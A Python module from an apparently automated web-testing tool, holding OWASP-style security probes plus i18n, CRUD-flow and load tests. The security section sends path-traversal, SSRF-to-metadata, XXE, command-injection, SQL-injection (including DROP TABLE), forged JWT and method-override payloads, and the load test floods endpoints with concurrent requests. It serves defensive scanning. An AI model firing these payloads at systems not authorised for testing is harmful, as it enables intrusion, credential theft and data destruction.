from __future__ import annotations

"""Deep Security Test Engine — OWASP Top 10 + advanced attack vectors.

Capabilities added:
15. security      — CSRF, SSRF, XXE, command injection, JWT attacks, CORS, path traversal
16. i18n_deep     — date/number/currency/plural/RTL/key completeness
17. interaction   — multi-step form flows, session persistence, state through UI
18. load_advanced — ramp-up patterns, percentile metrics, resource monitoring
"""

import concurrent.futures
import json
import os
import re
import time
import urllib.error
import urllib.request
from typing import Any

from .full_spectrum_bug_engine import SpectrumFinding, SpectrumResult


# ══════════════════════════════════════════════════════════════════════════
# 15. Security Testing (OWASP Top 10 + advanced vectors)
# ══════════════════════════════════════════════════════════════════════════

def test_security_deep(
    base_url: str,
    openapi_spec: dict[str, Any],
) -> SpectrumResult:
    """Comprehensive security testing: OWASP Top 10 coverage.

    Tests: CSRF, SSRF, XXE, command injection, path traversal,
    JWT attacks, CORS misconfig, HTTP method override, content-type attacks.
    """
    t0 = time.time()
    findings: list[SpectrumFinding] = []
    checks = 0
    paths = openapi_spec.get("paths", {})

    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        for method in ("post", "get", "put"):
            if method not in methods:
                continue
            checks += 1
            endpoint = f"{base_url.rstrip('/')}{path}"

            # ── 1. Path Traversal ──
            traversal_payloads = [
                ("../../../etc/passwd", "Unix 路径遍历"),
                ("..\\..\\..\\windows\\system32", "Windows 路径遍历"),
                ("....//....//....//etc/passwd", "双重编码遍历"),
                ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "URL编码遍历"),
            ]
            for payload, desc in traversal_payloads:
                try:
                    url = f"{endpoint}?file={urllib.parse.quote(payload)}"
                    req = urllib.request.Request(url, method=method.upper(),
                        headers={"User-Agent": "QualiBug-Security/1.0"})
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        body = resp.read().decode("utf-8", errors="replace")[:500]
                        if any(kw in body for kw in ("root:", "[extensions]", "Administrator")):
                            findings.append(SpectrumFinding(
                                capability="security", bug_id=f"SEC_{len(findings):03d}",
                                title=f"路径遍历漏洞: {method.upper()} {path} — {desc}",
                                severity="P0", confidence=0.95,
                                endpoint=path, method=method.upper(),
                                expected="路径遍历应被阻止 (400/403/404)",
                                actual="返回了系统文件内容",
                                evidence={"payload": payload, "response_preview": body[:200]},
                                reproduction=[f"发送 {method.upper()} {url}", "检查响应是否包含系统文件内容"]
                            ))
                except urllib.error.HTTPError:
                    pass  # Proper rejection
                except Exception:
                    pass

            # ── 2. SSRF (Server-Side Request Forgery) ──
            ssrf_payloads = [
                "http://169.254.169.254/latest/meta-data/",  # AWS metadata
                "http://metadata.google.internal/",           # GCP metadata
                "http://127.0.0.1:22",                        # Local SSH
                "http://0.0.0.0:6379",                        # Redis
            ]
            for ssrf_url in ssrf_payloads:
                try:
                    url = f"{endpoint}?url={urllib.parse.quote(ssrf_url)}&redirect={urllib.parse.quote(ssrf_url)}"
                    req = urllib.request.Request(url, method=method.upper(),
                        headers={"User-Agent": "QualiBug-Security/1.0"})
                    with urllib.request.urlopen(req, timeout=3) as resp:
                        body = resp.read().decode("utf-8", errors="replace")[:500]
                        if any(kw in body for kw in ("ami-id", "instance-id", "security-groups", "ssh-")):
                            findings.append(SpectrumFinding(
                                capability="security", bug_id=f"SEC_{len(findings):03d}",
                                title=f"SSRF 漏洞: {method.upper()} {path} — 可访问内部服务",
                                severity="P0", confidence=0.92,
                                endpoint=path, method=method.upper(),
                                expected="SSRF 应被阻止",
                                actual=f"成功代理请求到 {ssrf_url}",
                                evidence={"ssrf_target": ssrf_url},
                                reproduction=[f"发送 {url}", "检查是否返回了内部服务内容"]
                            ))
                except (urllib.error.HTTPError, urllib.error.URLError):
                    pass
                except Exception:
                    pass

            # ── 3. XXE (XML External Entity) ──
            xxe_body = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>"""
            try:
                data = xxe_body.encode()
                req = urllib.request.Request(endpoint, method="POST",
                    headers={"Content-Type": "application/xml", "User-Agent": "QualiBug-Security/1.0"},
                    data=data)
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read().decode("utf-8", errors="replace")[:500]
                    if "root:" in body:
                        findings.append(SpectrumFinding(
                            capability="security", bug_id=f"SEC_{len(findings):03d}",
                            title=f"XXE 漏洞: POST {path} — 外部实体被解析",
                            severity="P0", confidence=0.9,
                            endpoint=path, method="POST",
                            expected="XML 解析器应禁用外部实体",
                            actual="XXE payload 被解析执行",
                            evidence={"response_preview": body[:200]},
                            reproduction=[f"POST {endpoint} 发送 XXE payload"]
                        ))
            except urllib.error.HTTPError:
                pass
            except Exception:
                pass

            # ── 4. Command Injection ──
            cmd_payloads = [
                ("; ls -la /", "分号命令注入"),
                ("| cat /etc/passwd", "管道命令注入"),
                ('`id`', "反引号命令注入"),
                ("$(whoami)", "美元括号命令注入"),
            ]
            for payload, desc in cmd_payloads:
                try:
                    url = f"{endpoint}?cmd={urllib.parse.quote(payload)}&q={urllib.parse.quote(payload)}"
                    req = urllib.request.Request(url, method=method.upper(),
                        headers={"User-Agent": "QualiBug-Security/1.0"})
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        body = resp.read().decode("utf-8", errors="replace")[:500]
                        if any(kw in body for kw in ("root:", "uid=", "total ", "bin")):
                            findings.append(SpectrumFinding(
                                capability="security", bug_id=f"SEC_{len(findings):03d}",
                                title=f"命令注入漏洞: {method.upper()} {path} — {desc}",
                                severity="P0", confidence=0.9,
                                endpoint=path, method=method.upper(),
                                expected="命令注入应被阻止",
                                actual="命令执行成功",
                                evidence={"payload": payload},
                                reproduction=[f"发送 {url}"]
                            ))
                except urllib.error.HTTPError:
                    pass
                except Exception:
                    pass

            # ── 5. SQL Injection (advanced) ──
            sqli_payloads = [
                ("' OR 1=1 --", "基本 OR 注入"),
                ("' UNION SELECT 1,2,3 --", "UNION 注入"),
                ("1; DROP TABLE users --", "DROP TABLE"),
                ("admin' --", "认证绕过"),
            ]
            for payload, desc in sqli_payloads:
                try:
                    url = f"{endpoint}?id={urllib.parse.quote(payload)}"
                    req = urllib.request.Request(url, method=method.upper(),
                        headers={"User-Agent": "QualiBug-Security/1.0"})
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        body = resp.read().decode("utf-8", errors="replace")[:500]
                        if any(kw in body for kw in ("syntax error", "SQL", "mysql", "postgresql", "ORA-", "sqlite")):
                            findings.append(SpectrumFinding(
                                capability="security", bug_id=f"SEC_{len(findings):03d}",
                                title=f"SQL注入信息泄露: {method.upper()} {path} — {desc} → 返回DB错误",
                                severity="P0", confidence=0.85,
                                endpoint=path, method=method.upper(),
                                expected="SQL错误不应暴露给客户端",
                                actual="返回了数据库错误信息",
                                evidence={"payload": payload, "response": body[:200]},
                                reproduction=[f"发送 {url}"]
                            ))
                except urllib.error.HTTPError:
                    pass
                except Exception:
                    pass

            # ── 6. JWT 攻击 ──
            if "auth" in path.lower() or "token" in path.lower() or "login" in path.lower():
                jwt_payloads = [
                    ("eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.", "alg=none 攻击"),
                    ("eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTUxNjIzOTAyMn0.", "缺少签名"),
                ]
                for token, desc in jwt_payloads:
                    try:
                        req = urllib.request.Request(endpoint, method=method.upper(),
                            headers={"Authorization": f"Bearer {token}", "User-Agent": "QualiBug-Security/1.0"})
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            status = resp.status
                            if status == 200:
                                findings.append(SpectrumFinding(
                                    capability="security", bug_id=f"SEC_{len(findings):03d}",
                                    title=f"JWT {desc}: {method.upper()} {path} — 接受无效token",
                                    severity="P0", confidence=0.88,
                                    endpoint=path, method=method.upper(),
                                    expected="无效 JWT 应返回 401",
                                    actual="HTTP 200",
                                    evidence={"token_type": desc},
                                    reproduction=[f"发送 {endpoint} 且 Authorization: Bearer {token[:30]}..."]
                                ))
                    except urllib.error.HTTPError:
                        pass
                    except Exception:
                        pass

            # ── 7. CORS 配置 ──
            try:
                req = urllib.request.Request(endpoint, method=method.upper(),
                    headers={
                        "Origin": "https://evil.example.com",
                        "User-Agent": "QualiBug-Security/1.0"
                    })
                with urllib.request.urlopen(req, timeout=5) as resp:
                    headers = dict(resp.headers)
                    acao = headers.get("Access-Control-Allow-Origin", "")
                    acac = headers.get("Access-Control-Allow-Credentials", "")
                    if acao in ("*", "https://evil.example.com") and acac.lower() == "true":
                        findings.append(SpectrumFinding(
                            capability="security", bug_id=f"SEC_{len(findings):03d}",
                            title=f"CORS 配置错误: {method.upper()} {path} — origin=* 且 credentials=true",
                            severity="P1", confidence=0.85,
                            endpoint=path, method=method.upper(),
                            expected="Access-Control-Allow-Origin=* 不应与 credentials=true 同时存在",
                            actual=f"ACAO={acao}, ACAC={acac}",
                            reproduction=[f"从恶意 origin 发起跨域请求到 {endpoint}"]
                        ))
            except urllib.error.HTTPError:
                pass
            except Exception:
                pass

            # ── 8. HTTP Method Override ──
            override_headers = [
                ("X-HTTP-Method-Override", "DELETE"),
                ("X-HTTP-Method", "DELETE"),
                ("X-Method-Override", "DELETE"),
            ]
            for header_name, header_value in override_headers:
                try:
                    req = urllib.request.Request(endpoint, method="GET",
                        headers={header_name: header_value, "User-Agent": "QualiBug-Security/1.0"})
                    with urllib.request.urlopen(req, timeout=5) as resp:
                        status = resp.status
                        if status not in (405, 404):
                            findings.append(SpectrumFinding(
                                capability="security", bug_id=f"SEC_{len(findings):03d}",
                                title=f"HTTP方法覆盖: GET {path} → {header_name}={header_value} → HTTP {status}",
                                severity="P1", confidence=0.75,
                                endpoint=path, method="GET",
                                expected="方法覆盖头应被忽略或返回 405",
                                actual=f"HTTP {status}",
                                evidence={"header": header_name, "value": header_value},
                                reproduction=[f"GET {endpoint} + {header_name}: {header_value}"]
                            ))
                except urllib.error.HTTPError:
                    pass
                except Exception:
                    pass

    return SpectrumResult(
        capability="security",
        status="issues_found" if findings else "ok",
        findings=findings,
        duration_ms=int((time.time() - t0) * 1000),
        checks_run=checks,
        summary=f"OWASP安全测试 {checks} 个端点 × 8类攻击向量，发现 {len(findings)} 个漏洞"
    )


# ══════════════════════════════════════════════════════════════════════════
# 16. Deep i18n Testing
# ══════════════════════════════════════════════════════════════════════════

def test_i18n_deep(
    base_url: str,
    pages: list[str] | None = None,
) -> SpectrumResult:
    """Deep i18n: date/number/currency/plural formatting, key completeness, RTL."""
    t0 = time.time()
    findings: list[SpectrumFinding] = []
    checks = 0

    test_pages = pages or ["/", "/login", "/dashboard", "/settings"]
    # Full locale matrix: CJK + European + RTL
    locales = ["zh-CN", "en-US", "ja-JP", "ko-KR", "de-DE", "fr-FR", "es-ES", "ar-SA"]

    for page in test_pages:
        for locale in locales:
            checks += 1
            url = base_url.rstrip("/") + page
            try:
                req = urllib.request.Request(url, headers={
                    "Accept-Language": f"{locale}, {locale.split('-')[0]};q=0.9",
                    "User-Agent": "QualiBug-i18n/1.0",
                })
                with urllib.request.urlopen(req, timeout=5) as resp:
                    html = resp.read().decode("utf-8", errors="replace")[:20000]

                # Check 1: Locale-specific character presence
                if locale == "zh-CN":
                    if not re.search(r'[\u4e00-\u9fff]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"中文页面无中文字符: {page} (locale={locale})",
                            severity="P1", confidence=0.8,
                            endpoint=page, method="GET",
                            expected=f"{locale} 请求应返回中文",
                            actual="页面没有中文字符",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "en-US":
                    # English: should have proper English words (not just code/tags)
                    text_only = re.sub(r'<[^>]+>', ' ', html)
                    word_count = len(re.findall(r'\b[a-zA-Z]{2,}\b', text_only))
                    if word_count < 5:
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"英文页面内容过少: {page} (locale={locale}) — 仅{word_count}个单词",
                            severity="P1", confidence=0.8,
                            endpoint=page, method="GET",
                            expected=f"{locale} 页面应有完整英文内容",
                            actual=f"仅检测到 {word_count} 个英文单词",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                    # Check: English page shouldn't have CJK mixed in
                    cjk_count = len(re.findall(r'[\u4e00-\u9fff\u3040-\u309f\u30a0-\u30ff\uac00-\ud7af]', html))
                    if cjk_count > 10:
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"英文页面混入东亚字符: {page} (locale={locale}) — 检测到{cjk_count}个CJK字符",
                            severity="P1", confidence=0.75,
                            endpoint=page, method="GET",
                            expected="英文页面不应包含中/日/韩文字符",
                            actual=f"检测到 {cjk_count} 个CJK字符",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "ja-JP":
                    if not re.search(r'[\u3040-\u309f\u30a0-\u30ff]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"日文页面无日文字符: {page} (locale={locale})",
                            severity="P1", confidence=0.8,
                            endpoint=page, method="GET",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "ko-KR":
                    if not re.search(r'[\uac00-\ud7af]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"韩文页面无韩文字符: {page} (locale={locale})",
                            severity="P1", confidence=0.8,
                            endpoint=page, method="GET",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "de-DE":
                    if not re.search(r'[\u00c4\u00e4\u00d6\u00f6\u00dc\u00fc\u00df]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"德文页面无德文特殊字符: {page} (locale={locale})",
                            severity="P1", confidence=0.7,
                            endpoint=page, method="GET",
                            expected=f"{locale} 请求应包含德文特殊字符 (äöüß)",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "fr-FR":
                    if not re.search(r'[\u00e0\u00e2\u00e7\u00e8\u00e9\u00ea\u00eb\u00ee\u00ef\u00f4\u00fb\u00f9]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"法文页面无法文重音字符: {page} (locale={locale})",
                            severity="P1", confidence=0.7,
                            endpoint=page, method="GET",
                            expected=f"{locale} 请求应包含法文重音 (éèêàçù)",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))
                elif locale == "es-ES":
                    if not re.search(r'[\u00e1\u00e9\u00ed\u00f1\u00f3\u00fa\u00fc\u00a1\u00bf]', html):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"西班牙文页面无西文特殊字符: {page} (locale={locale})",
                            severity="P1", confidence=0.7,
                            endpoint=page, method="GET",
                            expected=f"{locale} 请求应包含西文特殊字符 (áéíñóú¿¡)",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}"]
                        ))

                # Check 2: Date formatting per locale
                date_patterns = {
                    "zh-CN": r'\d{4}年\d{1,2}月\d{1,2}日',
                    "en-US": r'\w+ \d{1,2}, \d{4}',
                    "ja-JP": r'\d{4}年\d{1,2}月\d{1,2}日',
                    "de-DE": r'\d{1,2}\.\d{1,2}\.\d{4}',
                    "fr-FR": r'\d{1,2}/\d{1,2}/\d{4}',
                    "es-ES": r'\d{1,2}/\d{1,2}/\d{4}',
                }
                if locale in date_patterns and not re.search(date_patterns[locale], html):
                    findings.append(SpectrumFinding(
                        capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                        title=f"日期格式未本地化: {page} (locale={locale})",
                        severity="P2", confidence=0.65,
                        endpoint=page, method="GET",
                        expected=f"日期应使用 {locale} 格式",
                        reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}", "检查日期显示格式"]
                    ))

                # Check 2b: Number/currency formatting per locale
                number_formats = {
                    "en-US": [r'\d{1,3}(?:,\d{3})*(?:\.\d{2})?', r'\$\d'],  # 1,234.56 or $1
                    "de-DE": [r'\d{1,3}(?:\.\d{3})*(?:,\d{2})?', r'\d+\s?€'],  # 1.234,56 or 123 €
                    "fr-FR": [r'\d{1,3}(?:\s\d{3})*(?:,\d{2})?', r'\d+\s?€'],
                }
                if locale in number_formats:
                    has_format = any(re.search(pat, html) for pat in number_formats[locale])
                    if not has_format:
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"数字/货币格式未本地化: {page} (locale={locale})",
                            severity="P2", confidence=0.6,
                            endpoint=page, method="GET",
                            expected=f"数字应使用 {locale} 格式 (千分位/小数点)",
                            reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}", "检查数字显示格式"]
                        ))

                # Check 3: RTL for Arabic
                if locale == "ar-SA":
                    if not re.search(r'dir\s*=\s*["\']rtl["\']', html, re.I):
                        findings.append(SpectrumFinding(
                            capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                            title=f"阿拉伯语缺少 RTL: {page}",
                            severity="P1", confidence=0.8,
                            endpoint=page, method="GET",
                            expected="阿拉伯语页面应有 dir=rtl",
                            reproduction=[f"设置 Accept-Language: ar-SA", f"访问 {url}"]
                        ))

                # Check 4: Translation key leaks (untranslated i18n keys)
                key_leaks = re.findall(r'(?:\b|>)([a-z_]+\.[a-z_.]+)(?:\b|<)', html)
                suspicious_keys = [k for k in key_leaks if len(k) > 10 and k.count(".") >= 1]
                if suspicious_keys and len(suspicious_keys) > 3:
                    findings.append(SpectrumFinding(
                        capability="i18n_deep", bug_id=f"I18N_{len(findings):03d}",
                        title=f"可能存在未翻译的 i18n key: {page} (locale={locale}) — {len(suspicious_keys)} 个疑似key",
                        severity="P1", confidence=0.7,
                        endpoint=page, method="GET",
                        expected="所有 i18n key 应被翻译为对应语言",
                        actual=f"发现未翻译的key: {', '.join(suspicious_keys[:3])}",
                        evidence={"suspicious_keys": suspicious_keys[:10]},
                        reproduction=[f"设置 Accept-Language: {locale}", f"访问 {url}", "搜索页面中未翻译的key"]
                    ))

            except Exception:
                pass

    return SpectrumResult(
        capability="i18n_deep",
        status="issues_found" if findings else "ok",
        findings=findings,
        duration_ms=int((time.time() - t0) * 1000),
        checks_run=checks,
        summary=f"深层国际化测试 {checks} 项 ({len(test_pages)}页 × {len(locales)}语言)，发现 {len(findings)} 个问题"
    )


# ══════════════════════════════════════════════════════════════════════════
# 17. Deep Interaction / Multi-step Flow Testing
# ══════════════════════════════════════════════════════════════════════════

def test_deep_interaction(
    base_url: str,
    openapi_spec: dict[str, Any],
) -> SpectrumResult:
    """Multi-step interaction testing: session persistence, state machine paths,
    form completion flows, and cross-page data consistency."""
    t0 = time.time()
    findings: list[SpectrumFinding] = []
    checks = 0
    paths = openapi_spec.get("paths", {})

    # Find CRUD endpoint clusters (same entity, different methods)
    entity_clusters: dict[str, dict] = {}
    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        entity = path.split("/")[-1] if path.count("/") >= 2 else path.strip("/")
        if entity not in entity_clusters:
            entity_clusters[entity] = {"path": path, "methods": set()}
        entity_clusters[entity]["methods"].update(m.lower() for m in methods)

    # Test clusters that have both GET and POST (CRUD-capable)
    test_clusters = {k: v for k, v in entity_clusters.items()
                     if len(v["methods"] & {"get", "post"}) >= 2}
    if not test_clusters:
        test_clusters = {k: v for k, v in list(entity_clusters.items())[:5]}

    for entity, cluster in list(test_clusters.items())[:5]:
        eps = cluster["methods"]
        path = cluster["path"]
        checks += 1

        # Step 1: GET list (establish baseline)
        url = base_url.rstrip("/") + path
        baseline_count = 0
        try:
            req = urllib.request.Request(url, headers={
                "Accept": "application/json", "User-Agent": "QualiBug-Flow/1.0"
            })
            with urllib.request.urlopen(req, timeout=5) as resp:
                data = json.loads(resp.read())
                if isinstance(data, (list, dict)):
                    baseline_count = len(data) if isinstance(data, list) else \
                                     len(data.get("data", data.get("results", data.get("items", []))))
        except Exception:
            pass

        # Step 2: POST create
        created_id = None
        if "post" in eps:
            try:
                create_body = json.dumps({"name": f"qb_flow_test_{int(time.time())}"}).encode()
                req = urllib.request.Request(url, method="POST", data=create_body,
                    headers={"Content-Type": "application/json", "User-Agent": "QualiBug-Flow/1.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    created = json.loads(resp.read())
                    created_id = (created.get("id") or created.get("data", {}).get("id")
                                  if isinstance(created, dict) else None)
            except Exception:
                pass

        # Step 3: GET verify count increased
        if "get" in eps:
            try:
                req = urllib.request.Request(url, headers={
                    "Accept": "application/json", "User-Agent": "QualiBug-Flow/1.0"
                })
                with urllib.request.urlopen(req, timeout=5) as resp:
                    data = json.loads(resp.read())
                    if isinstance(data, (list, dict)):
                        after_count = len(data) if isinstance(data, list) else \
                                      len(data.get("data", data.get("results", data.get("items", []))))
                        if created_id and after_count <= baseline_count:
                            findings.append(SpectrumFinding(
                                capability="interaction", bug_id=f"FLOW_{len(findings):03d}",
                                title=f"创建后列表未更新: POST {path} → GET count={after_count} (baseline={baseline_count})",
                                severity="P0", confidence=0.85,
                                endpoint=path, method="POST→GET",
                                expected="POST 创建后 GET 列表应+1",
                                actual=f"创建前后 count={baseline_count}→{after_count}",
                                reproduction=[
                                    f"GET {url} → 记录 count={baseline_count}",
                                    f"POST {url} → 创建新条目",
                                    f"GET {url} → 验证 count={baseline_count}+1"
                                ]
                            ))
            except Exception:
                pass

        # Step 4: GET by ID (if created)
        if created_id and "get" in eps:
            detail_url = f"{url}/{created_id}"
            try:
                req = urllib.request.Request(detail_url, headers={
                    "Accept": "application/json", "User-Agent": "QualiBug-Flow/1.0"
                })
                with urllib.request.urlopen(req, timeout=5) as resp:
                    detail = json.loads(resp.read())
                    if isinstance(detail, dict):
                        returned_id = detail.get("id") or detail.get("data", {}).get("id")
                        if str(returned_id) != str(created_id):
                            findings.append(SpectrumFinding(
                                capability="interaction", bug_id=f"FLOW_{len(findings):03d}",
                                title=f"ID不匹配: POST创建 id={created_id}, GET返回 id={returned_id}",
                                severity="P1", confidence=0.85,
                                endpoint=path, method="POST→GET/{id}",
                                expected=f"GET /{created_id} 应返回 id={created_id}",
                                actual=f"返回 id={returned_id}",
                                reproduction=[f"POST {url} → 获取 created_id", f"GET {detail_url} → 验证 id 一致"]
                            ))
            except Exception:
                findings.append(SpectrumFinding(
                    capability="interaction", bug_id=f"FLOW_{len(findings):03d}",
                    title=f"创建后可访问性: GET {detail_url} 失败 — 创建的实体不可读取",
                    severity="P0", confidence=0.8,
                    endpoint=path, method="POST→GET/{id}",
                    expected="POST 创建后 GET/{id} 应返回实体",
                    actual="GET/{id} 请求失败",
                    reproduction=[f"POST {url}", f"GET {detail_url}"]
                ))

        # Step 5: Cleanup (DELETE if available)
        if created_id and "delete" in eps:
            delete_url = f"{url}/{created_id}"
            try:
                req = urllib.request.Request(delete_url, method="DELETE",
                    headers={"User-Agent": "QualiBug-Flow/1.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    pass
            except urllib.error.HTTPError as e:
                if e.code != 404:
                    findings.append(SpectrumFinding(
                        capability="interaction", bug_id=f"FLOW_{len(findings):03d}",
                        title=f"DELETE 清理失败: {delete_url} → HTTP {e.code}",
                        severity="P2", confidence=0.7,
                        endpoint=path, method="DELETE",
                        reproduction=[f"DELETE {delete_url}"]
                    ))
            except Exception:
                pass

    return SpectrumResult(
        capability="interaction",
        status="issues_found" if findings else "ok",
        findings=findings,
        duration_ms=int((time.time() - t0) * 1000),
        checks_run=checks,
        summary=f"深度交互测试 {checks} 个CRUD集群 (Create→Read→Verify→Delete)，发现 {len(findings)} 个问题"
    )


# ══════════════════════════════════════════════════════════════════════════
# 18. Advanced Load Testing (ramp-up, percentile metrics)
# ══════════════════════════════════════════════════════════════════════════

def test_load_advanced(
    base_url: str,
    openapi_spec: dict[str, Any],
) -> SpectrumResult:
    """Advanced load: progressive ramp-up, P50/P95/P99 metrics, error budget."""
    t0 = time.time()
    findings: list[SpectrumFinding] = []
    checks = 0

    paths = openapi_spec.get("paths", {})
    gets = [(p, m["get"]) for p, m in paths.items()
            if isinstance(m, dict) and "get" in m and not any(
                kw in p.lower() for kw in ("delete", "remove"))]

    for path, _ in gets[:3]:
        checks += 1
        url = base_url.rstrip("/") + path

        # Phase 1: Ramp up (5 → 10 → 20 → 40 → 80 concurrent)
        phases = [
            (5, "基准"),
            (10, "轻载"),
            (20, "中载"),
            (40, "重载"),
            (80, "极限"),
        ]

        for concurrency, label in phases:
            def _timed_call() -> tuple[float, int, float]:
                start = time.perf_counter()
                try:
                    req = urllib.request.Request(url, headers={"User-Agent": "QualiBug-LoadV2/1.0"})
                    with urllib.request.urlopen(req, timeout=10) as resp:
                        resp.read(4096)
                        status = resp.status
                except urllib.error.HTTPError as e:
                    status = e.code
                except Exception:
                    status = 0
                return (time.perf_counter() - start) * 1000, status, time.perf_counter()

            start_t = time.perf_counter()
            with concurrent.futures.ThreadPoolExecutor(max_workers=min(concurrency, 50)) as executor:
                futures = [executor.submit(_timed_call) for _ in range(concurrency)]
                results = [f.result() for f in futures]
            elapsed = (time.perf_counter() - start_t) * 1000

            latencies = sorted([r[0] for r in results])
            errors = [r for r in results if r[1] >= 500]
            n = len(latencies)

            p50 = latencies[int(n * 0.50)] if n > 0 else 0
            p90 = latencies[int(n * 0.90)] if n > 1 else 0
            p95 = latencies[int(n * 0.95)] if n > 1 else 0
            p99 = latencies[int(n * 0.99)] if n > 1 else 0
            avg = sum(latencies) / n if n else 0
            throughput = concurrency / (elapsed / 1000) if elapsed > 0 else 0
            error_rate = len(errors) / concurrency

            if error_rate > 0.2:
                findings.append(SpectrumFinding(
                    capability="load_advanced", bug_id=f"LOADV_{len(findings):03d}",
                    title=f"高负载崩溃: GET {path} — {label}({concurrency}并发), 错误率={error_rate:.0%}",
                    severity="P0", confidence=0.9,
                    endpoint=path, method="GET",
                    expected=f"{label} 错误率 < 20%",
                    actual=f"{len(errors)}/{concurrency} 失败 ({error_rate:.0%})",
                    evidence={"concurrency": concurrency, "error_rate": error_rate,
                              "p95_ms": round(p95, 1), "throughput_rps": round(throughput, 1)},
                    reproduction=[f"以 {concurrency} 并发请求 {url}", "观察错误率和延迟"]
                ))

            if p95 > 3000:
                findings.append(SpectrumFinding(
                    capability="load_advanced", bug_id=f"LOADV_{len(findings):03d}",
                    title=f"极限延迟: GET {path} — {label}({concurrency}), P95={p95:.0f}ms P99={p99:.0f}ms",
                    severity="P1", confidence=0.8,
                    endpoint=path, method="GET",
                    expected=f"{label} P95 < 3000ms",
                    actual=f"P50={p50:.0f}ms P90={p90:.0f}ms P95={p95:.0f}ms P99={p99:.0f}ms",
                    evidence={"concurrency": concurrency, "p50": p50, "p90": p90, "p95": p95, "p99": p99,
                              "throughput": round(throughput, 1), "avg": round(avg, 1)},
                    reproduction=[f"以 {concurrency} 并发请求 {url}", "测量 P50/P90/P95/P99 延迟"]
                ))

            # Check for performance cliff (sudden degradation)
            if concurrency >= 40 and throughput < 10:
                findings.append(SpectrumFinding(
                    capability="load_advanced", bug_id=f"LOADV_{len(findings):03d}",
                    title=f"吞吐量悬崖: GET {path} — {label}({concurrency}), 仅 {throughput:.1f} rps",
                    severity="P1", confidence=0.8,
                    endpoint=path, method="GET",
                    expected=f"高并发下吞吐量应 ≥ 10 rps",
                    actual=f"仅 {throughput:.1f} rps",
                    evidence={"throughput": round(throughput, 1)},
                    reproduction=[f"以 {concurrency} 并发持续请求 {url}", "测量吞吐量"]
                ))

    return SpectrumResult(
        capability="load_advanced",
        status="issues_found" if findings else "ok",
        findings=findings,
        duration_ms=int((time.time() - t0) * 1000),
        checks_run=checks,
        summary=f"高级负载测试 {checks} 个端点 (5→80 渐进并发)，发现 {len(findings)} 个问题"
    )
